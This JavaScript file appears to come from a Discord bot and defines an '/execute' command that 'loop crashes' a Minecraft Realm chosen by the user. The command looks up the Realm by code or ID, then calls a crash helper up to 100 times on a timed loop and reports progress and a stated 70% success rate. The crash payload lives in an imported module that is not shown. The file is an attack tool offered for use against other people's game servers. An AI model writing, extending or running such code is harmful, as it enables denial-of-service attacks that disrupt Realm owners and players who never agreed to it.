'use strict'

const { SlashCommandBuilder, ApplicationIntegrationType, InteractionContextType } = require('discord.js')
const { XboxAccount } = require('../stuff/api/xbox/xbox')
const { RealmAPI } = require('../stuff/api/realm/realm')
const { getAccountByDiscordId } = require('../database/models/account')
const { isValidRealmCode, isValidRealmId } = require('../stuff/utils/validation')
const { blockIfWhitelisted } = require('../stuff/utils/whitelistGuard')
const { successContainer, errorContainer, infoContainer, ComponentsV2Flags } = require('../stuff/utils/containers')
const logger = require('../stuff/utils/logger')

const createInstance = require('../stuff/bedrockx/helpers/createInstance')

const activeJobs = global.__executeActiveJobs || (global.__executeActiveJobs = new Map())

const LOOP_DELAY_MS = 12_500

const NOTE = '_This method has about a 70% success rate per loop, so not every loop will work._'

function cancellableDelay(ms, job) {
    return new Promise((resolve) => {
        if (job.cancelled) return resolve()
        const t = setTimeout(() => {
            job.onCancel = null
            resolve()
        }, ms)
        job.onCancel = () => {
            clearTimeout(t)
            resolve()
        }
    })
}

module.exports = {
    activeJobs,

    data: new SlashCommandBuilder()
        .setName('execute')
        .setDescription('Execute a loop crash on a Minecraft Realm')
        .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
        .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel])
        .addStringOption((option) => option
            .setName('destination')
            .setDescription('Realm code or id')
            .setRequired(true))
        .addIntegerOption((option) => option
            .setName('loops')
            .setDescription('Number of loops (5-100)')
            .setRequired(true)
            .setMinValue(5)
            .setMaxValue(100)),

    async execute(interaction) {
        const userId = interaction.user.id

        if (activeJobs.has(userId)) {
            await interaction.reply({
                components: [errorContainer('Already running', 'You already have an execute running. Use /cancel to stop it.')],
                flags: ComponentsV2Flags,
                ephemeral: true
            })
            return
        }

        await interaction.deferReply()

        const destination = interaction.options.getString('destination').trim()
        const loops = interaction.options.getInteger('loops') || 1

        const isId = isValidRealmId(destination)
        const isCode = isValidRealmCode(destination)

        if (isId && await blockIfWhitelisted(interaction, destination)) return

        if (!isId && !isCode) {
            await interaction.editReply({
                components: [errorContainer('Invalid destination', 'The value you provided is not a valid Realm code or Realm ID.')],
                flags: ComponentsV2Flags
            })
            return
        }

        const linkedAccount = await getAccountByDiscordId(userId)
        if (!linkedAccount) {
            await interaction.editReply({
                components: [errorContainer('No linked account', 'You need to link your Minecraft account first using /link.')],
                flags: ComponentsV2Flags
            })
            return
        }

        const account = new XboxAccount(userId)

        let realm
        try {
            const realmApi = new RealmAPI(account)
            await realmApi.init()

            realm = isId
                ? await realmApi.getRealmById(destination)
                : await realmApi.getRealmByCode(destination)

            if (!realm) {
                await interaction.editReply({
                    components: [errorContainer('Invalid destination', isId
                        ? 'No Realm was found for the provided ID.'
                        : 'No Realm was found for the provided code.')],
                    flags: ComponentsV2Flags
                })
                return
            }

            if (await blockIfWhitelisted(interaction, realm.id)) return

            delete realm.players
        } catch (error) {
            logger.error(`[/execute] Lookup failed for ${userId}: ${error.message}`)
            await interaction.editReply({
                components: [errorContainer('Connection failed', 'Failed to look up the Realm. Please try again.')],
                flags: ComponentsV2Flags
            })
            return
        }

        const INTERACTION_TOKEN_TTL_MS = 14 * 60 * 1000
        const interactionStart = interaction.createdTimestamp
        let fallbackMessage = null

        const safeEdit = async (payload) => {
            const tokenExpired = (Date.now() - interactionStart) >= INTERACTION_TOKEN_TTL_MS

            if (!tokenExpired && !fallbackMessage) {
                try {
                    await interaction.editReply(payload)
                    return
                } catch (err) {
                    logger.warn?.(`[/execute] editReply failed: ${err?.message ?? err}`)
                }
            }

            if (!fallbackMessage) {
                fallbackMessage = await interaction.channel.send(payload).catch(() => null)
            } else {
                await fallbackMessage.edit(payload).catch(() => {})
            }
        }

        let completedLoops = 0

        const job = {
            userId,
            cancelled: false,
            onCancel: null,
            cancel() {
                this.cancelled = true
                try { this.onCancel?.() } catch {}
            }
        }
        activeJobs.set(userId, job)

        try {
            const realmApi = new RealmAPI(account)
            await realmApi.init().catch(() => {})

            for (let i = 0; i < loops; i++) {
                if (job.cancelled) break

                await safeEdit({
                    components: [infoContainer('Executing', `**${realm.name}**\nLoop ${i + 1}/${loops} attempting…\n\n${NOTE}`)],
                    flags: ComponentsV2Flags
                })

                let host
                try {
                    host = await realmApi.getConnectionInfo(realm.id)
                } catch (error) {
                    await safeEdit({
                        components: [errorContainer('Execute failed', `**${realm.name}**\n${error.message || 'Failed to fetch realm connection info.'}`)],
                        flags: ComponentsV2Flags
                    })
                    if (i < loops - 1) await cancellableDelay(LOOP_DELAY_MS, job)
                    continue
                }

                if (host?.networkProtocol !== 'NETHERNET_JSONRPC') {
                    await safeEdit({
                        components: [errorContainer('Execute failed', `**${realm.name}**\n\`${host?.networkProtocol}\` is not a supported protocol for this method!`)],
                        flags: ComponentsV2Flags
                    })
                    break
                }

                try {
                    await createInstance(realm, account, {
                        protocol: host.networkProtocol,
                        address: host.address,
                        external: { enabled: true, type: 3 }
                    })
                    completedLoops++
                } catch (error) {
                    logger.error(`[/execute] createInstance failure for ${userId}: ${error.message}`)
                }

                if (job.cancelled) break

                if (i < loops - 1) {
                    await safeEdit({
                        components: [infoContainer('Executing', `**${realm.name}**\nLoop ${i + 1}/${loops} done. Attempting…\n\n${NOTE}`)],
                        flags: ComponentsV2Flags
                    })
                    await cancellableDelay(LOOP_DELAY_MS, job)
                }
            }

            if (job.cancelled) {
                await safeEdit({
                    components: [infoContainer('Execute cancelled', `**${realm.name}**\nCancelled after ${completedLoops}/${loops} loop(s).`)],
                    flags: ComponentsV2Flags
                })
            } else {
                await safeEdit({
                    components: [successContainer('Execute complete', `**${realm.name}**\nCompleted ${completedLoops}/${loops} loop(s).`)],
                    flags: ComponentsV2Flags
                })
            }
        } catch (error) {
            logger.error(`[/execute] Loop error for ${userId}: ${error.message}`)
            await safeEdit({
                components: [errorContainer('Execute failed', 'An unexpected error occurred during execution.')],
                flags: ComponentsV2Flags
            }).catch(() => {})
        } finally {
            activeJobs.delete(userId)
        }
    }
}
